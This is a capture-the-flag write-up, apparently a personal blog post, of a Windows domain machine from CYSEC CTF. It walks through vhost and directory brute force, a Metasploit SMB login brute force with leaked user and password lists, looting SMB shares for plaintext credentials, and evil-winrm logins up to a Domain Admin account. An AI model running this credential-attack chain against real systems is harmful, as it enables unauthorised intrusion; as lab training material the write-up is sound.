---
layout: post
title: "Keep It Simple, Stupid"
date: 2022-05-15
categories: [ctf,machine]
---
## CYSEC CTF - Keep It Simple, Stupid
CYSEC CTF was organized by <a href="https://twitter.com/CYSECNG" target="_blank" rel="noopener">CYSECNG</a> .This CTF was good thanks to organizers.
Username <a href="https://twitter.com/blackninja233" target="_blank" rel="noopener">blackninja23</a> from my team <a href="https://twitter.com/UdomCyberClub" target="_blank" rel="noopener">UdomCyberClub</a>. I was first blood to root this good machine from this ctf.

<img src='/assets/img/Keep_it_Simple_Stupid_CYSEC/profile.png' alt='profile'>

According to this challenge, we are need to add cysec.local to /etc/hosts

```sudo echo -n "54.234.92.201 cysec.local" >> /etc/hosts```
# Enumeration
Starting off with a nmap scan:

```nmap -sC -sV 54.234.92.201```

<img src='/assets/img/Keep_it_Simple_Stupid_CYSEC/nmap.png' alt='nmap'>

We have 4 ports open which are 80,389,445 and 9999

# port 445 enumeration
Try to check for anonymous login
```md
smbclient -L //54.234.92.201
```
```md         
Password for [WORKGROUP\blackninja23]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 54.234.92.201 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```

But as you can see from above, we can login as anonymous but we can't list for shares
Also you can check if it is vulnerable to CVEs but so far nothing

# port 80 enumeration
Visit cysec.local in browser and it give default page of IIS. From here, i try many things but one of them succeced which it is enumeration for vhosts
```md
gobuster vhost -u http://cysec.local/ -w /usr/share/wordlists/dirb/common.txt -q
```
```md
Found: .history.cysec.local (Status: 400) [Size: 334]
Found: .bash_history.cysec.local (Status: 400) [Size: 334]
Found: .forward.cysec.local (Status: 400) [Size: 334]     
Found: .hta.cysec.local (Status: 400) [Size: 334]         
Found: .git/HEAD.cysec.local (Status: 400) [Size: 334]    
Found: .cache.cysec.local (Status: 400) [Size: 334]       
Found: .config.cysec.local (Status: 400) [Size: 334]      
Found: .bashrc.cysec.local (Status: 400) [Size: 334]      
Found: .cvs.cysec.local (Status: 400) [Size: 334]         
Found: .cvsignore.cysec.local (Status: 400) [Size: 334]   
Found: .mysql_history.cysec.local (Status: 400) [Size: 334]
Found: .listing.cysec.local (Status: 400) [Size: 334]      
Found: .passwd.cysec.local (Status: 400) [Size: 334]       
Found: .listings.cysec.local (Status: 400) [Size: 334]     
Found: .htpasswd.cysec.local (Status: 400) [Size: 334]     
Found: .htaccess.cysec.local (Status: 400) [Size: 334]     
Found: .perf.cysec.local (Status: 400) [Size: 334]         
Found: .sh_history.cysec.local (Status: 400) [Size: 334]   
Found: .profile.cysec.local (Status: 400) [Size: 334]      
Found: .rhosts.cysec.local (Status: 400) [Size: 334]       
Found: .ssh.cysec.local (Status: 400) [Size: 334]          
Found: .swf.cysec.local (Status: 400) [Size: 334]          
Found: .svn.cysec.local (Status: 400) [Size: 334]          
Found: .svn/entries.cysec.local (Status: 400) [Size: 334]  
Found: .web.cysec.local (Status: 400) [Size: 334]          
Found: .subversion.cysec.local (Status: 400) [Size: 334]   
Found: @.cysec.local (Status: 400) [Size: 334]             
Found: lost+found.cysec.local (Status: 400) [Size: 334]    
Found: secret.cysec.local (Status: 200) [Size: 13089]      
```

Other subdomains are not interested but secret.cysec.local seems interesting
we discover secret.cysec.local as vhost then we add it to /etc/hosts.

```sudo echo -n "54.234.92.201 secret.cysec.local" >> /etc/hosts```

Then Visit secret.cysec.local in browser and it give a page with title called CYSEC CTF.After a while looking at page and saw nothing.
Started to bruteforce for any interesting files or directories
```md
gobuster dir -u http://secret.cysec.local/ -w /usr/share/wordlists/dirb/common.txt -q
```
```md
/backups              (Status: 301) [Size: 157] [--> http://secret.cysec.local/backups/]
/css                  (Status: 301) [Size: 153] [--> http://secret.cysec.local/css/]    
/fonts                (Status: 301) [Size: 155] [--> http://secret.cysec.local/fonts/]  
/icon                 (Status: 301) [Size: 154] [--> http://secret.cysec.local/icon/]   
/images               (Status: 301) [Size: 156] [--> http://secret.cysec.local/images/] 
/Images               (Status: 301) [Size: 156] [--> http://secret.cysec.local/Images/] 
/index.html           (Status: 200) [Size: 13089]                                       
/js                   (Status: 301) [Size: 152] [--> http://secret.cysec.local/js/]  
```

# port 445 enumeration again
From there we discover folder backups which has users and passwords

<img src='/assets/img/Keep_it_Simple_Stupid_CYSEC/creds.png' alt='creds'>

download files
```md
wget http://secret.cysec.local/backups/passwords.txt && wget http://secret.cysec.local/backups/users.txt
```
After that we can now bruteforce smb service to see if one of user have successful login and i just short it to one command liner msfconsole
```md
msfconsole -q -x 'use auxiliary/scanner/smb/smb_login;set RHOSTS 54.234.92.201;set RPORT 445;set USER_FILE ~/CYSEC/users.txt;set PASS_FILE ~/CYSEC/passwords.txt;set VERBOSE false;run'
```
```md
RHOSTS => 54.234.92.201
RPORT => 445
USER_FILE => ~/CYSEC/users.txt
PASS_FILE => ~/CYSEC/passwords.txt
VERBOSE => false
[+] 54.234.92.201:445     - 54.234.92.201:445 - Success: '.\jsmith:Password@123'
[*] 54.234.92.201:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
We have user jsmith with login password and this user has access to smb and not winrm
You can check it with evilwinrm but we cant login so we need to play with smb
```md
evil-winrm -i 54.234.92.201 -u jsmith -p Password@123
```
We can now try to list shares like we did earlier
```md
smbclient -L //54.234.92.201 -U jsmith%Password@123
```
```md
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	confidential    Disk      Confidential Information for authorized personnels only
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	secret          Disk      
	SYSVOL          Disk      Logon server share 
	Users$          Disk      Domain Users
	wwwroot         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 54.234.92.201 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```
Many shares to look into them. After a while, i got username and password of another user but another interest file i found
the first file was these that was seems interested 

```md
smbclient //54.234.92.201/Users$ -U jsmith%Password@123
```
```
└─$ smbclient //54.234.92.201/Users$ -U jsmith%Password@123
Try "help" to get a list of possible commands.
smb: \> cd "jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
smb: \jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\> dir
  .                                   D        0  Thu Feb 24 00:53:14 2022
  ..                                  D        0  Thu Feb 24 00:53:14 2022
  RunWallpaperSetupInit.cmd           A      744  Thu Feb 24 01:01:03 2022

		7863807 blocks of size 4096. 2616990 blocks available
smb: \jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\> get RunWallpaperSetupInit.cmd
getting file \jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\RunWallpaperSetupInit.cmd of size 744 as RunWallpaperSetupInit.cmd (0.8 KiloBytes/sec) (average 0.8 KiloBytes/sec)
smb: \jsmith\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\> q
┌──(blackninja23㉿arena)-[~/CYSEC]
└─$ cat RunWallpaperSetupInit.cmd 
@Echo Off
REM Render instance information on current wallpaper if this is the wallpaper was never changed by user.
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "Import-Module "C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Ec2Launch.psd1"; Set-Wallpaper -Initial" & REM DELETEME
type "%~f0" | findstr /v DELETEME > "%~dp0RunWallpaperSetup.cmd"
DEL /Q /F "%~f0" & REM DELETEME
GOTO :EOF & REM DELETEME
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -NoLogo -WindowStyle hidden -ExecutionPolicy Unrestricted "Import-Module "C:\ProgramData\Amazon\EC2-Windows\Launch\Module\Ec2Launch.psd1"; Set-Wallpaper"    
```
The second file was these

```
└─$ smbclient //54.234.92.201/Users$ -U jsmith%Password@123
Try "help" to get a list of possible commands.
smb: \> cd "jsmith/Desktop"
smb: \jsmith\Desktop\> dir
  .                                  DR        0  Thu Mar  3 14:06:59 2022
  ..                                 DR        0  Thu Mar  3 14:06:59 2022
  EC2 Feedback.website                A      527  Tue Jun 21 18:36:17 2016
  EC2 Microsoft Windows Guide.website      A      554  Tue Jun 21 18:36:23 2016
  read_appraisal_form.ps1             A      289  Thu Mar  3 14:14:03 2022

		7863807 blocks of size 4096. 2616990 blocks available
smb: \jsmith\Desktop\> get read_appraisal_form.ps1
getting file \jsmith\Desktop\read_appraisal_form.ps1 of size 289 as read_appraisal_form.ps1 (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \jsmith\Desktop\> q
┌──(blackninja23㉿arena)-[~/CYSEC]
└─$ cat read_appraisal_form.ps1  
$passwd = ConvertTo-SecureString "SuperDuperSecurePassword1!" -ASPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ("cysec\hlevi", $passwd)

Get-ChildItem -Path "c:\shares\confidential" -Include *.txt | ForEach-Object {
    Write-Out $($_.FullName)
} 
```
As you can see from second file, it contains username and password of second user
```md
cysec\hlevi:SuperDuperSecurePassword1!
```

# Priviledge Escalation
User hlevi has access to winrm into the machine.This is where I am almost miss the password of admin.You can use automation tool but for this machine it was just to keep it simple.So i will just keep it simple
```md
evil-winrm -i 54.234.92.201 -u hlevi -p SuperDuperSecurePassword1!
```
```md
┌──(blackninja23㉿arena)-[~/CYSEC]
└─$ evil-winrm -i 54.234.92.201 -u hlevi -p SuperDuperSecurePassword1!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\hlevi\Documents> net user hlevi
User name                    hlevi
Full Name                    Hackerman Levi
Comment                      AllFortheLov3ofSh3ll!
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2022 10:07:32 AM
Password expires             Never
Password changeable          3/4/2022 10:07:32 AM
Password required            Yes
User may change password     No
```
Check the comment we can see a weird word that look interesting ```AllFortheLov3ofSh3ll!```
So let check for users
```md
net users
```
```md
*Evil-WinRM* PS C:\Users\hlevi\Documents> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            eyeager                  Guest
hlevi                    jsmith                   krbtgt
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\hlevi\Documents> 
```
We can see the user eyeager and Administrator are the one that we didnt try it so let me check them both
For user Administrator, we fail to login
For user eyeager we succefully login

```md
evil-winrm -i 54.234.92.201 -u eyeager -p AllFortheLov3ofSh3ll!
```
```md
┌──(blackninja23㉿arena)-[~/CYSEC]
└─$ evil-winrm -i 54.234.92.201 -u eyeager -p AllFortheLov3ofSh3ll!                                                                                                  1 ⨯

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\eyeager\Documents> 
```
let do some enum on this user eyeager
```md
net user eyeager
```
```md
*Evil-WinRM* PS C:\Users\eyeager\Documents> net user eyeager
User name                    eyeager
Full Name                    Eren Yeager
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/3/2022 11:42:49 AM
Password expires             Never
Password changeable          3/4/2022 11:42:49 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   4/12/2022 8:54:00 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Domain Admins
The command completed successfully.

```
User eyeager is in group 'Domain Admins'
```md
┌──(blackninja23㉿arena)-[~/CYSEC]
└─$ evil-winrm -i 54.234.92.201 -u eyeager -p AllFortheLov3ofSh3ll!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\eyeager\Documents> cd "C:\Users\Administrator\Desktop"
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir
   
   Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----         3/3/2022  11:54 AM             24 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
CYSEC{itz_all_n1ce&34sy}
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```
